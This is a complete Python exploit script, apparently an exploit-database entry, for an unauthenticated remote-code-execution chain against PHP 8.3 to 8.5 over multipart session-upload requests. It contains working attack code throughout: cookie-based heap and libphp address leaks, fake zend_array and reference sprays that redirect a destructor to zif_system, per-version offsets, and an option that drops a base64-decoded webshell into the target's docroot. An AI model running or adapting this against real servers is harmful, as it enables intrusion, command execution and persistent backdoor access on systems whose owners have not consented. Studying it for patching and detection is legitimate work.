#!/usr/bin/env python3
"""php2shell — unauthenticated RCE, PHP 8.3.35 / 8.4.26 / 8.5.10 / 8.5.11.

CVE-2026-109618 / CVE-2026-109619  (EDB-52704)
Core chain credited to 9bie and eness, adjusted by OffSec.

A single self-contained file. No helper scripts, no third-party deps.

Chain (attacker traffic is plain HTTP/HTTPS multipart):
  stage 0   HTTP worker rotation          -> fresh prefork child, clean heap
  stage 1   Set-Cookie heap leak          -> Zend MM chunk base  (2MB-aligned)
  stage 2   Set-Cookie libphp leak        -> libphp base         (4KB-aligned)
  stage 3a  8.3.35      fake-ref spray    (cheap OOM A + 995x384B B spray)
  stage 3b  8.4.26/8.5x carrier write     (15B bin-40 string + 167B fake array)
  shutdown  zval_ptr_dtor(&PS(http_session_vars)) -> fake pDestructor -> zif_system(cmd)
            -> RCE as www-data (uid=33)

Default proof: run a short command `id > <htdoc>/p1` (12 bytes, fits the 14-byte
carrier budget) and read it back with `GET <htdoc>/p1`  ->  uid=33(www-data).

Usage:
  python3 php2shell.py -t http://127.0.0.1:18112 -v 8.3.35
  python3 php2shell.py -t http://127.0.0.1:18113 -v 8.4.26
  python3 php2shell.py -t http://127.0.0.1:18114 -v 8.5.11
  python3 php2shell.py -t http://127.0.0.1:18115 -v 8.5.10

Options:
  -t, --target    target base URL (http:// or https://)
  -v, --version   8.3.35 | 8.4.26 | 8.5.10 | 8.5.11  (selects calibration)
  --cmd           shell command (<=14 bytes for the carrier path)
  --htdoc         target docroot dir (default /www)
  --proof         proof filename under the docroot (default p1)
  --shell FILE    OPTIONAL webshell to deploy (9bie path / 8.3.35 only, ~200B budget)
  --attempts      full-chain attempts (default 6)
"""
from __future__ import annotations

import argparse
import base64
import os
import re
import socket
import ssl
import struct
import sys
import threading
import time
import urllib.parse
import urllib.request
import urllib.error
from collections import Counter

# ---------------------------------------------------------------------------
# Per-version calibration. Official php:<ver>-apache, Debian bookworm, prefork.
#   zif / dtor : offsets inside libphp.so (zif_system / zval_ptr_dtor)
#   htdata     : offset (from chunk base) of the live 167B zend_string (carrier)
#   s_off      : offset (from chunk base) of the fake array (9bie spray, 8.3.35)
#   stage3     : "9bie" (8.3.35: carrier mis-lands) | "carrier" (8.4.26/8.5.x)
# ---------------------------------------------------------------------------
VERSIONS = {
    "8.3.35": dict(zif=0x3ac080, dtor=0x49ec50, htdata=0x690d8, s_off=0xF6398, stage3="9bie"),
    "8.4.26": dict(zif=0x465370, dtor=0x65eb60, htdata=0x690d8, stage3="carrier"),
    # 8.5.10 libphp.so differs from 8.5.11 (verified with nm):
    #   zif_system=0x598d60 (symtab), zval_ptr_dtor=0x7b3860 (dynsym)
    "8.5.10": dict(zif=0x598d60, dtor=0x7b3860, htdata=0x690d8, stage3="carrier"),
    "8.5.11": dict(zif=0x5996e0, dtor=0x7b47a0, htdata=0x690d8, stage3="carrier"),
}

HUGE_MB = 256          # OOM field; must exceed memory_limit (128M)
MAX_CMD = 14           # 167-byte carrier - 0x98 header - NUL
SID = b"attacksessionid0001"

# bookworm (official php:<ver>-apache) stage-1/2/3 calibration
STAGE1_N = 841
STAGE2_T = 406
STAGE2_V = 16
STAGE3_PADS = [(31, 31)] * 6


# ---------------------------------------------------------------------------
# Target (raw HTTP; TLS optional)
# ---------------------------------------------------------------------------
class Target:
    def __init__(self, url: str, timeout: float = 30.0, verbose: bool = False):
        u = urllib.parse.urlsplit(url)
        if u.scheme not in ("http", "https"):
            raise ValueError("URL must be http:// or https://")
        self.https = u.scheme == "https"
        self.host = u.hostname or "127.0.0.1"
        self.port = u.port or (443 if self.https else 80)
        self.path = u.path or "/"
        self.timeout = timeout
        self.verbose = verbose

    def log(self, msg: str) -> None:
        if self.verbose:
            print(msg, flush=True)

    def _connect(self):
        last = None
        for _ in range(10):
            try:
                s = socket.create_connection((self.host, self.port), timeout=self.timeout)
                if self.https:
                    ctx = ssl.create_default_context()
                    ctx.check_hostname = False
                    ctx.verify_mode = ssl.CERT_NONE
                    s = ctx.wrap_socket(s, server_hostname=self.host)
                try:
                    s.setsockopt(socket.IPPROTO_TCP, socket.TCP_NODELAY, 1)
                except OSError:
                    pass
                return s
            except OSError as e:
                last = e
                time.sleep(0.3)
        raise last  # type: ignore[misc]

    def post(self, body: bytes, boundary: bytes, read_cap: int = 1 << 20,
             timeout: float | None = None,
             extra_headers: dict[str, str] | None = None) -> bytes:
        extra = ""
        for k, v in (extra_headers or {}).items():
            extra += f"{k}: {v}\r\n"
        hdr = (
            f"POST {self.path} HTTP/1.1\r\n"
            f"Host: {self.host}:{self.port}\r\n"
            f"{extra}"
            f"Content-Type: multipart/form-data; boundary={boundary.decode()}\r\n"
            f"Content-Length: {len(body)}\r\n"
            "Connection: close\r\n\r\n"
        ).encode()
        s = self._connect()
        s.settimeout(timeout or self.timeout)

        if isinstance(s, ssl.SSLSocket):
            # SSLSocket is NOT thread-safe: send the whole body first, then read.
            data = bytearray()
            try:
                s.sendall(hdr)
                mv = memoryview(body)
                for off in range(0, len(body), 262144):
                    s.sendall(mv[off:off + 262144])
            except OSError:
                pass  # the worker may abort mid-upload
            try:
                while len(data) < read_cap:
                    c = s.recv(65536)
                    if not c:
                        break
                    data.extend(c)
            except OSError:
                pass
            s.close()
            return bytes(data)

        # Plain TCP: kernel-level thread-safe I/O — read the response
        # concurrently with the upload (the worker may RST right after
        # sending Set-Cookie; a late recv() would lose the buffered reply).
        data = bytearray()

        def _reader() -> None:
            try:
                while len(data) < read_cap:
                    c = s.recv(65536)
                    if not c:
                        break
                    data.extend(c)
            except OSError:
                pass

        reader = threading.Thread(target=_reader, daemon=True)
        reader.start()
        try:
            try:
                s.sendall(hdr)
                mv = memoryview(body)
                for off in range(0, len(body), 262144):
                    s.sendall(mv[off:off + 262144])
            except OSError:
                pass
            reader.join(timeout=(timeout or self.timeout) + 1.0)
            return bytes(data)
        finally:
            s.close()

    def get(self, path: str, read_cap: int = 1 << 20) -> tuple[int, bytes]:
        hdr = (
            f"GET {path} HTTP/1.1\r\n"
            f"Host: {self.host}:{self.port}\r\n"
            "Connection: close\r\n\r\n"
        ).encode()
        s = self._connect()
        s.settimeout(self.timeout)
        try:
            s.sendall(hdr)
            data = bytearray()
            try:
                while len(data) < read_cap:
                    c = s.recv(65536)
                    if not c:
                        break
                    data += c
            except OSError:
                pass
        finally:
            s.close()
        head, _, body = bytes(data).partition(b"\r\n\r\n")
        m = re.match(rb"HTTP/1\.[01] (\d{3})", head)
        return (int(m.group(1)) if m else 0), body


def build_multipart(parts, boundary: bytes) -> bytes:
    out = bytearray()
    for p in parts:
        name = p["name"].encode()
        out += b"--" + boundary + b"\r\n"
        out += b'Content-Disposition: form-data; name="' + name + b'"'
        if p.get("filename") is not None:
            out += b'; filename="' + p["filename"].encode() + b'"'
            out += b"\r\nContent-Type: application/octet-stream"
        out += b"\r\n\r\n" + p["data"] + b"\r\n"
    out += b"--" + boundary + b"--\r\n"
    return bytes(out)


def parse_cookie(resp: bytes) -> bytes:
    m = re.search(rb"Set-Cookie: PHPSESSID=([^\r\n]*?); path=/", resp)
    if not m:
        return b""
    return urllib.parse.unquote_to_bytes(m.group(1).decode("latin1"))


def chunk_base_from_cookie(raw: bytes) -> int:
    """Stage 1: 2MB-aligned mode of the heap pointers in the decoded cookie."""
    if len(raw) < 1000:
        return 0
    c: Counter[int] = Counter()
    for i in range(0, len(raw) - 8, 8):
        v = int.from_bytes(raw[i:i + 8], "little")
        if 0x700000000000 <= v < 0x800000000000:
            c[v & ~0x1FFFFF] += 1
    if not c:
        return 0
    base, count = c.most_common(1)[0]
    return base if count >= 8 else 0


def libphp_base_from_cookie(raw: bytes, dtor_offset: int) -> int:
    """Stage 2: Set-Cookie data starts at PS(id)+0x18 = nNextFreeElement|pDestructor."""
    if len(raw) < 16:
        return 0
    p = int.from_bytes(raw[8:16], "little")
    if not (0x700000000000 <= p < 0x800000000000):
        return 0
    if (p & 0xFFF) != (dtor_offset & 0xFFF):
        return 0
    base = p - dtor_offset
    return base if base & 0xFFF == 0 else 0


# ---------------------------------------------------------------------------
# Exploit engine (stage 0-2 + carrier stage 3)
# ---------------------------------------------------------------------------
class Exploit:
    def __init__(self, target: Target, cmd: str, zif_offset: int, dtor_offset: int,
                 htdata_offset: int, huge_mb: int = HUGE_MB,
                 verbose: bool = False):
        self.t = target
        self.cmd = cmd.encode()
        self.zif_offset = zif_offset
        self.dtor_offset = dtor_offset
        self.htdata_offset = htdata_offset
        self.huge_mb = huge_mb
        self.verbose = verbose
        self.stage1_n = STAGE1_N
        self.stage2_t = STAGE2_T
        self.stage2_v = STAGE2_V
        self.stage3_pads = list(STAGE3_PADS)
        self.stage3_carrier = True
        self.stage3_b2_pre = 0

    def _big_field(self) -> dict:
        return {"name": "big", "data": b"B" * (self.huge_mb * 1024 * 1024)}

    def _file_part(self) -> dict:
        return {"name": "f", "filename": "a.txt", "data": b"A" * 64}

    def rotate(self) -> None:
        """Abort the current worker over HTTP; prefork forks a fresh one."""
        parts = [{"name": f"f{i:04d}"[:5], "data": b"V" * 3000} for i in range(1001)]
        parts += [
            {"name": "PHPSESSID", "data": b"\x00"},
            {"name": "PHP_SESSION_UPLOAD_PROGRESS", "data": b"pwn"},
            self._file_part(),
            self._big_field(),
        ]
        self.t.post(build_multipart(parts, b"S" * 17), b"S" * 17,
                    read_cap=1 << 20, timeout=max(90.0, self.t.timeout))
        time.sleep(0.3)
        parts = [
            {"name": "PHPSESSID", "data": SID},
            {"name": "PHP_SESSION_UPLOAD_PROGRESS", "data": b"pwn"},
        ]
        self.t.post(build_multipart(parts, b"BNDRY12345"), b"BNDRY12345",
                    read_cap=65536, timeout=20.0)
        time.sleep(0.5)

    def stage1(self) -> int:
        """Leak the Zend MM chunk base."""
        parts = [{"name": f"p{i:04d}", "data": b"x"} for i in range(1001)]
        parts += [
            {"name": "PHPSESSID", "data": b"\x00"},
            {"name": "PHP_SESSION_UPLOAD_PROGRESS", "data": b"pwn"},
            self._file_part(),
            self._big_field(),
        ]
        self.t.post(build_multipart(parts, b"S" * 17), b"S" * 17,
                    read_cap=1 << 20, timeout=max(90.0, self.t.timeout))
        time.sleep(0.2)

        parts = [
            {"name": "PHPSESSID", "data": SID},
            {"name": "PHP_SESSION_UPLOAD_PROGRESS", "data": b"pwn"},
        ]
        for i in range(self.stage1_n):
            val = (f"v{i:04d}" + "x" * 44)[:48]
            parts.append({"name": str(1000 + i), "data": val.encode()})
        forge = bytearray(b"A" * 79)
        struct.pack_into("<Q", forge, 0x10, 0x1000)   # forged zend_string len
        forge[0x18] = ord("L")
        parts.append({"name": "1999", "data": bytes(forge)})

        resp = self.t.post(build_multipart(parts, b"B" * 10), b"B" * 10, read_cap=9 << 20)
        return chunk_base_from_cookie(parse_cookie(resp))

    def stage2(self) -> int:
        """Leak libphp base through a 56-byte HashTable page."""
        parts = [{"name": f"f{i:04d}"[:5], "data": b"x" * 39} for i in range(1001)]
        parts += [
            {"name": "PHPSESSID", "data": b"\x00"},
            {"name": "PHP_SESSION_UPLOAD_PROGRESS", "data": b"pwn"},
            self._file_part(),
            self._big_field(),
        ]
        self.t.post(build_multipart(parts, b"S" * 17), b"S" * 17,
                    read_cap=1 << 20, timeout=max(90.0, self.t.timeout))
        time.sleep(0.2)

        parts = [
            {"name": "PHPSESSID", "data": SID},
            {"name": "PHP_SESSION_UPLOAD_PROGRESS", "data": b"pwn"},
        ]
        for i in range(983):
            cnt = 16 if i == self.stage2_t else 1
            for j in range(cnt):
                parts.append({"name": f"a{i:04d}[{j}]", "data": b"x" * self.stage2_v})

        resp = self.t.post(build_multipart(parts, b"B" * 10), b"B" * 10, read_cap=1 << 20)
        return libphp_base_from_cookie(parse_cookie(resp), self.dtor_offset)

    def _fake_payload(self, htdata: int, zif: int) -> tuple[bytes, bytes]:
        cmd = self.cmd
        if len(cmd) > MAX_CMD:
            raise ValueError(f"command is {len(cmd)} bytes; the 167-byte carrier "
                             f"allows at most {MAX_CMD} (e.g. use 'id>/www/p1')")
        ht = bytearray(b"\x00" * 167)
        struct.pack_into("<II", ht, 0x00, 1, 7)
        struct.pack_into("<II", ht, 0x08, 0x10, 0xFFFFFFF8)
        struct.pack_into("<Q", ht, 0x10, htdata + 0x20)
        struct.pack_into("<II", ht, 0x18, 1, 1)
        struct.pack_into("<II", ht, 0x20, 8, 0)
        struct.pack_into("<Q", ht, 0x28, 0)
        struct.pack_into("<Q", ht, 0x30, zif)
        E = 0x20
        struct.pack_into("<Q", ht, E + 0x00, 0)
        struct.pack_into("<Q", ht, E + 0x08, 0)
        struct.pack_into("<Q", ht, E + 0x10, zif)
        struct.pack_into("<Q", ht, E + 0x18, 0)
        struct.pack_into("<Q", ht, E + 0x20, 0)
        struct.pack_into("<I", ht, E + 0x28, 0)
        struct.pack_into("<I", ht, E + 0x2C, 1)
        struct.pack_into("<Q", ht, E + 0x30, 0)
        struct.pack_into("<Q", ht, E + 0x38, 0)
        struct.pack_into("<I", ht, E + 0x40, 0)
        struct.pack_into("<Q", ht, E + 0x50, htdata + 0x80)
        struct.pack_into("<I", ht, E + 0x58, 6)
        struct.pack_into("<II", ht, 0x80, 1, 0x106)
        struct.pack_into("<Q", ht, 0x88, 0)
        struct.pack_into("<Q", ht, 0x90, len(cmd))
        ht[0x98:0x98 + len(cmd)] = cmd
        ht[0x98 + len(cmd)] = 0

        ref = bytearray(b"X" * 55)
        struct.pack_into("<II", ref, 0x10, 1, 10)
        struct.pack_into("<Q", ref, 0x18, htdata)
        struct.pack_into("<Q", ref, 0x20, 0x307)
        struct.pack_into("<Q", ref, 0x28, 0)
        return bytes(ht), bytes(ref)

    def stage3(self, htdata: int, zif: int) -> None:
        """Carrier: write the fake reference over PS(http_session_vars) and execute."""
        parts = [
            {"name": "PHPSESSID", "data": b"a" * 19},
            {"name": "PHP_SESSION_UPLOAD_PROGRESS", "data": b"p" * 3},
        ]
        for i, (nl, vl) in enumerate(self.stage3_pads):
            name = (f"p{i:0{nl - 1}d}" if nl > 0 else "")[:nl]
            parts.append({"name": name, "data": b"V" * vl})
        parts += [self._file_part(), self._big_field()]
        extra = {"Cookie": "PHPSESSID=" + "a" * 32}
        self.t.post(build_multipart(parts, b"S" * 17), b"S" * 17,
                    read_cap=1 << 20, timeout=max(90.0, self.t.timeout),
                    extra_headers=extra)
        time.sleep(0.3)

        ht, _ref = self._fake_payload(htdata, zif)
        parts = [
            {"name": "PHPSESSID", "data": SID},
            {"name": "PHP_SESSION_UPLOAD_PROGRESS", "data": b"pwn"},
        ]
        carrier = struct.pack("<II", 1, 0x1A) + struct.pack("<Q", htdata)[:7]
        for i in range(self.stage3_b2_pre):
            parts.append({"name": f"f{i:02d}", "data": b"F" * 15})
        parts.append({"name": "g00", "data": carrier})
        for i in range(15):
            parts.append({"name": f"a{i:030d}"[:31], "data": ht})
        self.t.post(build_multipart(parts, b"B" * 10), b"B" * 10,
                    read_cap=65536, timeout=30.0)


# ---------------------------------------------------------------------------
# 9bie fake-ref spray (8.3.35) — cheap OOM A + 995x384B B spray
# ---------------------------------------------------------------------------
def _raw_post(host: str, port: int, tls: bool, path: str, body: bytes,
              boundary: bytes, timeout: float = 60.0) -> bytes:
    req = (f"POST {path} HTTP/1.1\r\nHost: {host}:{port}\r\n"
           f"Content-Type: multipart/form-data; boundary={boundary.decode()}\r\n"
           f"Content-Length: {len(body)}\r\nConnection: close\r\n\r\n").encode()
    resp = bytearray()
    s = socket.create_connection((host, port), timeout=timeout)
    s.settimeout(timeout)
    if tls:
        ctx = ssl.create_default_context()
        ctx.check_hostname = False
        ctx.verify_mode = ssl.CERT_NONE
        s = ctx.wrap_socket(s, server_hostname=host)
    try:
        s.sendall(req + body)
        while len(resp) < (1 << 20):
            c = s.recv(65536)
            if not c:
                break
            resp.extend(c)
    except OSError:
        pass
    s.close()
    return bytes(resp)


def build_ht(htdata: int, zif: int, cmd: bytes, size: int = 384) -> bytes:
    """384-byte fake zend_array: pDestructor=zif_system, arg string at htdata+0x80."""
    ht = bytearray(b"\x00" * size)
    struct.pack_into("<II", ht, 0x00, 1, 7)
    struct.pack_into("<II", ht, 0x08, 0x10, 0xFFFFFFF8)
    struct.pack_into("<Q", ht, 0x10, htdata + 0x20)
    struct.pack_into("<II", ht, 0x18, 1, 1)
    struct.pack_into("<II", ht, 0x20, 8, 0)
    struct.pack_into("<Q", ht, 0x28, 0)
    struct.pack_into("<Q", ht, 0x30, zif)
    E = 0x20
    struct.pack_into("<Q", ht, E + 0x00, 0)
    struct.pack_into("<Q", ht, E + 0x08, 0)
    struct.pack_into("<Q", ht, E + 0x10, zif)
    struct.pack_into("<Q", ht, E + 0x18, 0)
    struct.pack_into("<Q", ht, E + 0x20, 0)
    struct.pack_into("<I", ht, E + 0x28, 0)
    struct.pack_into("<I", ht, E + 0x2C, 1)
    struct.pack_into("<Q", ht, E + 0x30, 0)
    struct.pack_into("<Q", ht, E + 0x38, 0)
    struct.pack_into("<I", ht, E + 0x40, 0)
    struct.pack_into("<Q", ht, E + 0x50, htdata + 0x80)
    struct.pack_into("<I", ht, E + 0x58, 6)
    struct.pack_into("<II", ht, 0x80, 1, 0x106)
    struct.pack_into("<Q", ht, 0x88, 0)
    struct.pack_into("<Q", ht, 0x90, len(cmd))
    ht[0x98:0x98 + len(cmd)] = cmd
    ht[0x98 + len(cmd)] = 0
    return bytes(ht)


def oom_a(host: str, port: int, tls: bool, parts: int = 880, depth: int = 64,
          fillers: int = 115) -> None:
    """A: cheap OOM (nested empty file fields) -> dangling PS(http_session_vars)."""
    boundary = b"C" * 10
    out = bytearray()

    def part(name: bytes, value: bytes = b"", filename: bytes | None = None) -> None:
        nonlocal out
        out += b"--" + boundary + b"\r\nContent-Disposition: form-data; name=\"" + name + b"\""
        if filename is not None:
            out += b'; filename="' + filename + b'"'
        out += b"\r\n\r\n" + value + b"\r\n"

    part(b"PHPSESSID", b"a" * 32)
    part(b"PHP_SESSION_UPLOAD_PROGRESS", b"k0")
    for i in range(fillers):
        part(("%03d" % i).encode(), b"x")
    for i in range(parts):
        name = b"files[R%05d" % i + b"]" + b"[a]" * (depth - 2)
        out += b"--" + boundary + b"\r\nContent-Disposition: form-data; name=\"" + name + \
               b'"; filename=""\r\nContent-Type: application/octet-stream\r\n\r\n'
    out += b"--" + boundary + b"--\r\n"
    _raw_post(host, port, tls, "/index.php", bytes(out), boundary)


def fake_ref_b(host: str, port: int, tls: bool, ht_addr: int, ht: bytes,
               vl: int = 384, n1: int = 500, n2: int = 495) -> None:
    """B: 995x384B spray; each 32B slot is a fake reference to the fake array."""
    boundary = b"C" * 10
    out = bytearray()

    def fake_ref() -> bytes:
        rv = bytearray(32)
        struct.pack_into("<I", rv, 0, 1)          # rc = 1
        rv[4] = 0x0A                               # IS_REFERENCE
        struct.pack_into("<Q", rv, 8, ht_addr)     # ptr = fake array
        struct.pack_into("<I", rv, 16, 0x0107)     # val.type
        return bytes(rv)

    def spray() -> bytes:
        v = bytearray(b"S" * vl)
        o = 8
        while o + 32 <= vl:
            v[o:o + 32] = fake_ref()
            o += 32
        return bytes(v)

    def part(name: bytes, value: bytes) -> None:
        nonlocal out
        out += b"--" + boundary + b"\r\nContent-Disposition: form-data; name=\"" + name + \
               b'"\r\n\r\n' + value + b"\r\n"

    sp = spray()
    for i in range(n1):
        part((b"s" + ("%09d" % i).encode())[:10], sp)
    part(b"ht", ht)
    part(b"PHPSESSID", b"a" * 32)
    part(b"PHP_SESSION_UPLOAD_PROGRESS", b"k0")
    for i in range(n2):
        part((b"t" + ("%09d" % i).encode())[:10], sp)
    out += b"--" + boundary + b"--\r\n"
    _raw_post(host, port, tls, "/index.php", bytes(out), boundary)


def stage3_9bie(host: str, port: int, tls: bool, S: int, zif: int, cmd: str) -> None:
    ht = build_ht(S, zif, cmd.encode())
    oom_a(host, port, tls, 880, 64, 115)
    time.sleep(0.3)
    fake_ref_b(host, port, tls, S, ht, 384, 500, 495)


# ---------------------------------------------------------------------------
# Proof
# ---------------------------------------------------------------------------
def http_get(url: str, timeout: float = 15.0) -> tuple[int, bytes]:
    ctx = None
    if url.lower().startswith("https://"):
        ctx = ssl.create_default_context()
        ctx.check_hostname = False
        ctx.verify_mode = ssl.CERT_NONE
    try:
        with urllib.request.urlopen(url, timeout=timeout, context=ctx) as r:
            return r.status, r.read()
    except urllib.error.HTTPError as e:
        try:
            return e.code, e.read()
        except Exception:
            return e.code, b""
    except Exception as e:  # noqa: BLE001
        return 0, str(e).encode()


def run_once(t: Target, cfg: dict, cmd: str, host: str, port: int, tls: bool,
             htdata_off: int | None = None) -> None:
    off = cfg["htdata"] if htdata_off is None else htdata_off
    ex = Exploit(t, cmd, cfg["zif"], cfg["dtor"], off)
    ex.rotate()
    chunk = 0
    for _ in range(4):
        ex.rotate()
        chunk = ex.stage1()
        if chunk:
            break
    if not chunk:
        return
    ex.rotate()
    libphp = 0
    for _ in range(4):
        ex.rotate()
        libphp = ex.stage2()
        if libphp:
            break
    if not libphp:
        return
    zif = libphp + cfg["zif"]
    if cfg["stage3"] == "9bie":
        stage3_9bie(host, port, tls, chunk + cfg["s_off"], zif, cmd)
    else:
        ex.stage3(chunk + off, zif)
    time.sleep(0.8)


def main() -> int:
    ap = argparse.ArgumentParser(description="php2shell unauthenticated RCE (4 PHP versions)")
    ap.add_argument("-t", "--target", default="http://127.0.0.1:8080")
    ap.add_argument("-v", "--version", default="8.4.26", choices=sorted(VERSIONS))
    ap.add_argument("--cmd", default=None, help="shell command (<=14B for carrier)")
    ap.add_argument("--htdoc", default="/www")
    ap.add_argument("--proof", default="p1")
    ap.add_argument("--shell", default=None,
                    help="OPTIONAL webshell file (9bie/8.3.35 only, ~200B budget)")
    ap.add_argument("--attempts", type=int, default=6)
    a = ap.parse_args()

    cfg = VERSIONS[a.version]
    u = urllib.parse.urlsplit(a.target)
    host = u.hostname or "127.0.0.1"
    scheme = (u.scheme or "http").lower()
    tls = scheme == "https"
    port = u.port or (443 if tls else 80)
    base = f"{scheme}://{host}:{port}"
    hdoc = a.htdoc.rstrip("/")

    if a.shell:
        sp = a.shell if os.path.isabs(a.shell) else os.path.join(os.path.dirname(os.path.abspath(__file__)), a.shell)
        name = os.path.basename(sp)
        b64 = base64.b64encode(open(sp, "rb").read()).decode()
        CMD = f"echo {b64}|base64 -d > {hdoc}/{name}"
        proof_url = f"{name}?c=id"
        if cfg["stage3"] != "9bie":
            raise SystemExit("--shell is only available on the 9bie path (8.3.35); "
                             "the carrier caps the command at 14 bytes")
    else:
        CMD = a.cmd or f"id>{hdoc}/{a.proof}"
        proof_url = a.proof
    budget = 200 if cfg["stage3"] == "9bie" else MAX_CMD
    if len(CMD.encode()) > budget:
        raise SystemExit(f"CMD {len(CMD.encode())}B exceeds the {cfg['stage3']} budget ({budget}B)")

    print(f"[*] php2shell  {a.version}  target={base}  stage3={cfg['stage3']}", flush=True)
    print(f"[*] zif=0x{cfg['zif']:x} dtor=0x{cfg['dtor']:x} htdata=0x{cfg['htdata']:x}"
          + (f" s_off=0x{cfg['s_off']:x}" if "s_off" in cfg else ""), flush=True)
    print(f"[*] cmd: {CMD!r}   proof: GET {base}/{proof_url}", flush=True)

    t = Target(f"{base}/", timeout=30)
    t0 = time.time()
    for attempt in range(1, a.attempts + 1):
        run_once(t, cfg, CMD, host, port, tls)
        for ph in [host] + (["127.0.0.1"] if host != "127.0.0.1" else []):
            st, body = http_get(f"{scheme}://{ph}:{port}/{proof_url}")
            if st == 200 and b"uid=" in body:
                print(f"[+] RCE PROVEN  {a.version}  stage3={cfg['stage3']}  "
                      f"({time.time() - t0:.1f}s)", flush=True)
                print(f"    GET {scheme}://{ph}:{port}/{proof_url}", flush=True)
                print(f"    {body.decode('latin1').strip()}", flush=True)
                return 0
            print(f"  [attempt {attempt}] {ph}:{port}/{proof_url} -> "
                  f"{st} {body[:80]!r}", flush=True)
    print(f"[-] FAILED  {a.version}  ({time.time() - t0:.1f}s)", flush=True)
    return 1


if __name__ == "__main__":
    sys.exit(main())
